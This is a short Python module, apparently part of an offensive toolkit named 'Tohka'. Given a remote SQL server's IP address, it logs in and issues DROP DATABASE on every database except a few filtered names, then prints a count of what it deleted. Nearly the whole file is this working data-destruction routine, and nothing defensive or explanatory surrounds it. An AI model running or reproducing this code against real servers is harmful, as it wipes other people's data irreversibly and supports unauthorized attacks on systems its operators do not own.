from Tohka.lib.constants import SQL_FILTER #type: ignore
from Tohka.lib.colors    import Colors     #type: ignore
from Tohka.lib.login     import login_sql  #type: ignore
from Tohka.lib.ui        import TOHKA      #type: ignore





class TohkaModule:
    def main(params: str) -> None:
        """Wipe all SQL databases
        Args:
            params(str): SQL server IP address
        
        Returns:
            None
        """
        db_removed: int = 0

        if (conn := login_sql(params)):
            print(f'\n{Colors.YELLOW}• {Colors.WHITE}Attempting to remove all database\'s...')
            cursor = conn.cursor()
            cursor.execute('show databases')
            for db in [db[0] for db in cursor.fetchall() if not tuple(filt for filt in SQL_FILTER if filt in db[0])]:
                cursor.execute(f'DROP DATABASE {db}')
                db_removed += 1

            print(f'{Colors.LIME}• {TOHKA} {Colors.WHITE}has removed {Colors.VIOLET}{db_removed} {Colors.WHITE}database\'s')
        print()

        